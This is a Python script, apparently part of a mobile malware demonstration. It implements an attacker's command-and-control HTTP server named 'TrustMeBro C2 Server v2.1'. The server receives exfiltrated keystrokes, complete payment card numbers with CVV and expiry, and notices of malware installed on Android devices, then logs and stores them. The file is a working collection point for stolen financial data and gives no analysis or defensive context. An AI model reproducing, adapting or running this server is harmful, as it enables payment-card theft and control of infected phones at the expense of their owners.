#!/usr/bin/env python3

from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import sys
from datetime import datetime
from colorama import Fore, Back, Style, init

init(autoreset=True)

# store all exfiltrated data
EXFILTRATED_DATA = []
KEYSTROKE_BUFFER = {
    "card": "",
    "cvv": "",
    "expiry": ""
}

MALWARE_INSTALLATIONS = []

class AttackerServerHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)

        try:
            payload = json.loads(post_data.decode('utf-8'))

            if payload.get('exfil_type') == 'keystroke':
                self.handle_keystroke_exfil(payload)
            elif payload.get('exfil_type') == 'complete_payment':
                self.handle_complete_payment(payload)
            elif payload.get('malware_triggered'):
                self.handle_malware_installation(payload)

            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"status": "received"}).encode('utf-8'))

        except Exception as e:
            print(f"Error processing: {e}")
            self.send_response(500)
            self.end_headers()

    def handle_keystroke_exfil(self, payload):
        field_type = payload.get('field_type')
        field_value = payload.get('field_value')
        KEYSTROKE_BUFFER[field_type] = field_value

        print(f"{Fore.CYAN}{datetime.now().strftime('%H:%M:%S.%f')[:-3]} ", end="")
        print(f"{Fore.YELLOW}[KEYSTROKE] {field_type.capitalize()}: {Fore.RED}{field_value}")
        sys.stdout.flush()

    def handle_complete_payment(self, payload):
        print("\n" + "="*70)
        print(Fore.RED + " COMPLETE PAYMENT DATA EXFILTRATED!" + Style.RESET_ALL)
        print(f"{Fore.RED}CARD: {payload.get('card_number')}")
        print(f"{Fore.RED}CVV: {payload.get('cvv')} | EXP: {payload.get('expiry')}")
        print("="*70 + "\n")
        EXFILTRATED_DATA.append(payload)

    def handle_malware_installation(self, payload):
        print("\n" + "="*70)
        print(Fore.RED + Back.BLACK + Style.BRIGHT + "MALWARE ACTIVE ON DEVICE!" + Style.RESET_ALL)
        print(f"{Fore.YELLOW}Model: {payload.get('phone_model')} | Android: {payload.get('android_version')}")
        print("="*70 + "\n")
        MALWARE_INSTALLATIONS.append(payload)

    def log_message(self, format, *args):
        return

class AttackerC2Server:
    def __init__(self, port=8080):
        self.port = port
        self.server = HTTPServer(('0.0.0.0', port), AttackerServerHandler)

    def start(self):
        print("\n" + "="*70)
        print(Fore.RED + Back.BLACK + Style.BRIGHT + "  TrustMeBro C2 Server v2.1" + Style.RESET_ALL)
        print("="*70)
        print(f"Listening on: http://0.0.0.0:{self.port}")
        print(f"Setup: {Fore.GREEN}adb reverse tcp:{self.port} tcp:{self.port}")
        print("="*70 + "\n")
        self.server.serve_forever()

if __name__ == '__main__':
    AttackerC2Server(port=8080).start()